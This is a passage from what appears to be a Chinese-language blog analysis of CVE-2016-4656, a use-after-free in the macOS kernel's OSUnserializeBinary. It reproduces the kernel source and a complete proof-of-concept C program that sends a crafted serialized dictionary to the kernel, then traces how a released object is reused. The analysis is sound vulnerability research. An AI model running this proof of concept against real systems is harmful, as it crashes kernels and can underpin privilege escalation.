v##Capacity * sizeof(o));						\</span><br><span class="line">			kfree(v##Array, v##Capacity * sizeof(o));							\</span><br><span class="line">		&#125;																		\</span><br><span class="line">		v##Array    = nbuf;														\</span><br><span class="line">		v##Capacity = ncap;														\</span><br><span class="line">	&#125;																			\</span><br><span class="line">	<span class="keyword">if</span> (ok) v##Array[idx] = o;</span></span><br></pre></td></tr></table></figure>
<p>这一段宏用在代码中大意如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (idx&gt;v<span class="preprocessor">##capacity)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 扩充数组*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ok) </span><br><span class="line">&#123;</span><br><span class="line">  v<span class="preprocessor">##Array[idx]=o</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大意就是讲数据<code>o</code>放置到数组中的<code>idx</code>处，如果数组不够大了就扩充一下数组的大小。</p>
<h2 id="1-3_源码分析">1.3 源码分析</h2><p>​    该函数的大致流程与我们通常遇到的反序列化函数形式基本相同，分为以下几步</p>
<ul>
<li>检测二进制文件格式，是否符合要求</li>
<li>依次读取二进制数据，进行分析，并且将解析的结果存放到对应的数据结构之中</li>
</ul>
<h3 id="1-3-1_二进制文件格式">1.3.1 二进制文件格式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测是否是是具有签名的内存数据</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">strcmp</span>(kOSSerializeBinarySignature, buffer)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">3</span> &amp; ((<span class="keyword">uintptr_t</span>) buffer)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 检测buffersize的大小要小于kOSSerializeBinarySignature的大小</span></span><br><span class="line"><span class="keyword">if</span> (bufferSize &lt; <span class="keyword">sizeof</span>(kOSSerializeBinarySignature)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>可以看出，需要解析的二进制数据，一定是已<code>kOSSerializeBinarySignature</code>开始的。具体的定义如下图所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> kOSSerializeBinarySignature <span class="string">"\323\0\0"</span></span></span><br></pre></td></tr></table></figure>
<p>在通过签名的检测之后，就会根据每一块读出的内存进行分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      key = *next++;</span><br><span class="line"></span><br><span class="line">      len = (key &amp; kOSSerializeDataMask); <span class="comment">//获取len的值</span></span><br><span class="line">      wordLen = (len + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>; <span class="comment">//计算要用几个word</span></span><br><span class="line">   end = (<span class="number">0</span> != (kOSSerializeEndCollecton &amp; key)) <span class="comment">//获取end的值;</span></span><br><span class="line">   	<span class="comment">/*...*/</span></span><br><span class="line"><span class="comment">//根据key的不同对不同的数据结构做操作</span></span><br><span class="line"><span class="keyword">switch</span> (kOSSerializeTypeMask &amp; key)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*....*/</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-3-2_数据存放">1.3.2 数据存放</h3><p>解析之后得到的数据，会被存放到对应的数据结构之中去。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">//如果反序列化的结果不是一个reference</span></span><br><span class="line">	<span class="comment">//就将结果存放到objsCapacity之中</span></span><br><span class="line">	<span class="comment">//如果反序列化自后内存申请失败,则退出反序列化</span></span><br><span class="line">	<span class="keyword">if</span> (!isRef)</span><br><span class="line">	&#123;</span><br><span class="line">		setAtIndex(objs, objsIdx, o);</span><br><span class="line">		<span class="comment">//如果ok的值为false，则退出反序列化循环</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//	#define kalloc_container(size)	\</span></span><br><span class="line">				kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">			typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">			if (!nbuf) ok = false;</span><br><span class="line">		*/</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//在内核中申请ncap*sizeof（o）大小的内存，如果申请失败的了则ok设为false</span></span><br><span class="line">		<span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		objsIdx++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果存在一个解析出来的dict</span></span><br><span class="line">	<span class="keyword">if</span> (dict)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (sym)</span><br><span class="line">		&#123;</span><br><span class="line">			DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">			<span class="keyword">if</span> (o != dict) </span><br><span class="line">			&#123;</span><br><span class="line">				ok = dict-&gt;setObject(sym, o);</span><br><span class="line">			&#125;</span><br><span class="line">			o-&gt;release();</span><br><span class="line">			sym-&gt;release();</span><br><span class="line">			sym = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">			sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">			<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">			&#123;</span><br><span class="line">			    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">			    o-&gt;release();</span><br><span class="line">			    o = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ok = (sym != <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">array</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		ok = <span class="built_in">array</span>-&gt;setObject(o);</span><br><span class="line">	    o-&gt;release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	   ok = <span class="built_in">set</span>-&gt;setObject(o);</span><br><span class="line">	   o-&gt;release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	    assert(!parent);</span><br><span class="line">	    result = o;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (newCollect)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!end)</span><br><span class="line">		&#123;</span><br><span class="line">			stackIdx++;</span><br><span class="line">			setAtIndex(<span class="built_in">stack</span>, stackIdx, parent);</span><br><span class="line">			<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DEBG(<span class="string">"++stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">		parent = o;</span><br><span class="line">		dict   = newDict;</span><br><span class="line">		<span class="built_in">array</span>  = newArray;</span><br><span class="line">		<span class="built_in">set</span>    = newSet;</span><br><span class="line">		end    = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!stackIdx) <span class="keyword">break</span>;</span><br><span class="line">		parent = stackArray[stackIdx];</span><br><span class="line">		DEBG(<span class="string">"--stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">		stackIdx--;</span><br><span class="line">		<span class="built_in">set</span>   = <span class="number">0</span>; </span><br><span class="line">		dict  = <span class="number">0</span>; </span><br><span class="line">		<span class="built_in">array</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!(<span class="built_in">array</span> = OSDynamicCast(OSArray, parent))) ok = (<span class="number">0</span> != (<span class="built_in">set</span> = OSDynamicCast(OSSet, parent)));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对<code>reference</code>,<code>dict</code>,<code>set</code>,<code>array</code>都有相应的处理分支。</p>
<h1 id="0x02_POC的分析">0x02 POC的分析</h1><h2 id="2-1_POC">2.1 POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * Simple POC to trigger CVE-2016-4656 (C) Copyright 2016 Stefan Esser / SektionEins GmbH</span><br><span class="line"> * compile on OS X like:</span><br><span class="line"> *    gcc -arch i386 -framework IOKit -o ex exploit.c</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;mach/mach.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;IOKit/IOKitLib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;IOKit/iokitmig.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">  kOSSerializeDictionary   = <span class="number">0x01000000</span>U,</span><br><span class="line">  kOSSerializeArray        = <span class="number">0x02000000</span>U,</span><br><span class="line">  kOSSerializeSet          = <span class="number">0x03000000</span>U,</span><br><span class="line">  kOSSerializeNumber       = <span class="number">0x04000000</span>U,</span><br><span class="line">  kOSSerializeSymbol       = <span class="number">0x08000000</span>U,</span><br><span class="line">  kOSSerializeString       = <span class="number">0x09000000</span>U,</span><br><span class="line">  kOSSerializeData         = <span class="number">0x0a000000</span>U,</span><br><span class="line">  kOSSerializeBoolean      = <span class="number">0x0b000000</span>U,</span><br><span class="line">  kOSSerializeObject       = <span class="number">0x0c000000</span>U,</span><br><span class="line">  kOSSerializeTypeMask     = <span class="number">0x7F000000</span>U,</span><br><span class="line">  kOSSerializeDataMask     = <span class="number">0x00FFFFFF</span>U,</span><br><span class="line">  kOSSerializeEndCollecton = <span class="number">0x80000000</span>U,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> kOSSerializeBinarySignature <span class="string">"\323\0\0"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> * data = <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">uint32_t</span> * ptr = (<span class="keyword">uint32_t</span> *) data;</span><br><span class="line">  <span class="keyword">uint32_t</span> bufpos = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">mach_port_t</span> master = <span class="number">0</span>, res;</span><br><span class="line">  <span class="keyword">kern_return_t</span> kr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create header */</span></span><br><span class="line">  <span class="built_in">memcpy</span>(data, kOSSerializeBinarySignature, <span class="keyword">sizeof</span>(kOSSerializeBinarySignature));</span><br><span class="line">  bufpos += <span class="keyword">sizeof</span>(kOSSerializeBinarySignature);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create a dictionary with 2 elements */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeDictionary | kOSSerializeEndCollecton | <span class="number">2</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* our key is a OSString object */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeString | <span class="number">7</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = <span class="number">0x41414141</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = <span class="number">0x00414141</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* our data is a simple boolean */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeBoolean | <span class="number">64</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* now create a reference to object 1 which is the OSString object that was just freed */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeObject | <span class="number">1</span>; bufpos += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* get a master port for IOKit API */</span></span><br><span class="line">  host_get_io_master(mach_host_self(), &amp;master);</span><br><span class="line">  <span class="comment">/* trigger the bug */</span></span><br><span class="line">  kr = io_service_get_matching_services_bin(master, data, bufpos, &amp;res);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"kr: 0x%x\n"</span>, kr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显，<code>poc</code>创建了一个<code>dict</code>，这个<code>dict</code>有两个元素，第一个元素是<code>key</code>为<code>“AAAAAAA”</code>的字符串，值为一个<code>Boolean</code>。第二个元素是第一个元素的一个<code>reference</code>。</p>
<p>内核在反序列化这一段字符串的时候就会触发漏洞。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-4656/crash.png" alt="crash"></p>
<p>结合<code>OSUnserializeBinary</code>，来分析一下，到底发生了一些什么。</p>
<h2 id="2-2_流程">2.2 流程</h2><h3 id="2-2-1_kOSSerializeDictionary">2.2.1 kOSSerializeDictionary</h3><p>通过解析，二进制文件首先会进入<code>kOSSerializeDictionary</code>的分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> kOSSerializeDictionary:</span><br><span class="line">	o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">	newCollect = (len != <span class="number">0</span>);</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>break</code>之后，执行<code>setAtIndex</code>宏。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] = dict</span><br></pre></td></tr></table></figure>
<p>因为其他条件都不满足，代码会进入处理新容器的分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (newCollect)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!end)</span><br><span class="line">	&#123;</span><br><span class="line">		stackIdx++;</span><br><span class="line">		setAtIndex(<span class="built_in">stack</span>, stackIdx, parent);</span><br><span class="line">		<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG(<span class="string">"++stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">	parent = o;</span><br><span class="line">	dict   = newDict;</span><br><span class="line">	<span class="built_in">array</span>  = newArray;</span><br><span class="line">	<span class="built_in">set</span>    = newSet;</span><br><span class="line">	end    = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而给<code>dict</code>赋值<code>newDict</code>。从而创建了一个<code>dict</code>用来存储后续的数据。</p>
<h3 id="2-2-2_kOSSerializeString与kOSSerializeBoolean">2.2.2 kOSSerializeString与kOSSerializeBoolean</h3><p>第一个元素的<code>key</code>是一个字符串，通过源码解析。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">case kOSSerializeString:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSString::withStringOfLength((const char *) next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br></pre></td></tr></table></figure>
<p>获得字符串<code>o</code>。</p>
<p><code>break</code>之后，执行<code>setAtIndex</code>宏。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] = dict</span><br><span class="line">objsArray[<span class="number">1</span>] = <span class="string">"0x0041414141414141"</span></span><br></pre></td></tr></table></figure>
<p>因为<code>dict</code>已经创建，进入<code>dict</code>的处理流程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (sym)</span><br><span class="line">			&#123;</span><br><span class="line">				DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				<span class="keyword">if</span> (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();</span><br><span class="line">				sym-&gt;release();</span><br><span class="line">				sym = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);				<span class="comment">//&lt;--进入这个分支</span></span><br><span class="line">				<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>sym</code>并不存在，所以根据<code>o</code>转换出<code>sym</code>。</p>
<p>第一个元素的值是一个bool值，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> kOSSerializeBoolean:</span><br><span class="line">		o = (len ? kOSBooleanTrue : kOSBooleanFalse);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>break</code>之后，执行<code>setAtIndex</code>宏。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] =&gt; dict</span><br><span class="line">objsArray[<span class="number">1</span>] =&gt; <span class="string">"0x0041414141414141"</span></span><br><span class="line">objsArray[<span class="number">2</span>] =&gt; <span class="literal">true</span>	<span class="comment">//不知道是不是true，瞎写的，这里不重要</span></span><br></pre></td></tr></table></figure>
<p>再次进入<code>dict</code>的处理分支，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (sym)<span class="comment">//&lt;--进入这个分支</span></span><br><span class="line">			&#123;</span><br><span class="line">				DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				<span class="keyword">if</span> (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();	<span class="comment">//objsArrays[2]指向o</span></span><br><span class="line">				sym-&gt;release();	<span class="comment">//objsArrays[1]指向sym</span></span><br><span class="line">				sym = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);				</span><br><span class="line">				<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>sym</code>已经存在了，所以进入了上面的分支，在处理完成之后，对<code>o</code>和<code>sym</code>都进行了<code>release</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] =&gt; dict</span><br><span class="line">objsArray[<span class="number">1</span>] =&gt; <span class="string">"0x0041414141414141"</span>	<span class="comment">//released</span></span><br><span class="line">objsArray[<span class="number">2</span>] =&gt; <span class="literal">true</span>				   <span class="comment">//released</span></span><br></pre></td></tr></table></figure>
<h3 id="2-2-3_kOSSerializeObject">2.2.3 kOSSerializeObject</h3><p>第二个元素的是一个<code>reference</code>，处理的代码如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="keyword">case</span> kOSSerializeObject:</span><br><span class="line"><span class="keyword">if</span> (len &gt;= objsIdx) <span class="keyword">break</span>;</span><br><span class="line">o = objsArray[len];	<span class="comment">//len的值为1</span></span><br><span class="line">o-&gt;retain();</span><br><span class="line">isRef = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>o</code>取出数组中<code>objsArray[1]</code>,是一个已经被释放了的元素。</p>
<p>再通过<code>dict</code>处理的代码时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果存在一个解析出来的dict</span></span><br><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (sym)</span><br><span class="line">	&#123;</span><br><span class="line">		DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">		<span class="keyword">if</span> (o != dict) </span><br><span class="line">		&#123;</span><br><span class="line">			ok = dict-&gt;setObject(sym, o);</span><br><span class="line">		&#125;</span><br><span class="line">		o-&gt;release();</span><br><span class="line">		sym-&gt;release();</span><br><span class="line">		sym = <span 